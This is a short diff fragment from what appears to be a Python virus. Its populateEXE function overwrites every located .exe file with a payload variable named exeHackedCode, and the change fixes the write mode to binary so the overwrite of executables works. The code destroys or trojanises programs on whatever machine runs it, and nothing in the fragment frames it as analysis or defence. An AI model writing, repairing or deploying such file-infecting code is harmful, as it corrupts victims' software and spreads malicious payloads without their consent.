@@ -345,7 +345,7 @@ def findEXE():
         populateEXE()
 def populateEXE():
     for l in range(len(pathsToEXE)):
-        EXEFile = open(pathsToEXE[l - 1], "w")
+        EXEFile = open(pathsToEXE[l - 1], "wb")
         EXEFile.write(exeHackedCode)
         EXEFile.close()
 
